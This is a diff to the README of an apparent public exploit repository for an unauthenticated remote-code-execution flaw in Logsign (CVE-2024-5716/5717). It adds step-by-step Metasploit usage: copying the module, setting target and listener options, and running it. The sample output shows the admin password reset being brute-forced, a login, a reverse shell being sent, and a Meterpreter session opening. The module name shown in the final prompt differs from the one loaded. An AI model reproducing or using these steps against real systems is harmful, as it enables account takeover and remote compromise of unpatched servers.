@@ -24,7 +24,7 @@ To use these template with Nuclei, follow the example steps below:
 git clone https://github.com/j4nk3/logsign-unauth-rce.git
 cd logsign-unauth-rce
 ```
-### Scanning with Nuclei:
+### Usage with Nuclei:
 
 **Single Target:**
 ```sh
@@ -33,6 +33,41 @@ nuclei -u https://target.com -t logsign-unauth-rce.yaml -nh
 **Multiple Target:**
 ```sh
 nuclei -l urls.txt -t logsign-unauth-rce.yaml -nh
+```
+
+### Usage with Metasploit
+```
+# Step 1: Copy the .rb file to the Metasploit modules directory
+sudo cp logsign-unauth-rce.rb /usr/share/metasploit-framework/modules/auxiliary/exploit/
+
+# Step 2: Start Metasploit
+msfconsole
+
+# Step 3: Load the module
+msf6 > use auxiliary/exploit/logsign-unauth-rce
+
+# Step 4: Set the required options
+msf6 auxiliary(exploit/logsign-unauth-rce) > set TARGETURI /
+msf6 auxiliary(exploit/logsign-unauth-rce) > set USERNAME admin
+msf6 auxiliary(exploit/logsign-unauth-rce) > set LHOST 0.0.0.0
+msf6 auxiliary(exploit/logsign-unauth-rce) > set LPORT 1337
+msf6 auxiliary(exploit/logsign-unauth-rce) > set RHOSTS 192.168.1.10
+msf6 auxiliary(exploit/logsign-unauth-rce) > set RPORT 443
+
+# Step 5: Run the exploit
+msf6 auxiliary(exploit/logsign-unauth-rce) > run
+
+[*] Resetting admin password using CVE-2024-5716...
+[*] Forget password request sent for user: admin
+[*] Successfully brute-forced reset code: 123456, verification code: 7890
+[*] Password successfully reset to: Hkdi2983jdlGfdLS
+[*] Successfully logged in with the new password. Session cookie: PHPSESSID=abcd1234...
+[*] Sending reverse shell payload...
+[*] Exploit completed, waiting for session...
+
+[*] Meterpreter session 1 opened (192.168.1.100:1337 -> 192.168.1.10:443) at 2024-08-12 12:34:56 +0000
+msf6 auxiliary(exploit/cve_2024_5716_5717_pre_auth_rce) >
+
 ```
 
 Many thanks to @mdisec (Mehmet Ince) for the security research and critical finding detections performed on this product.
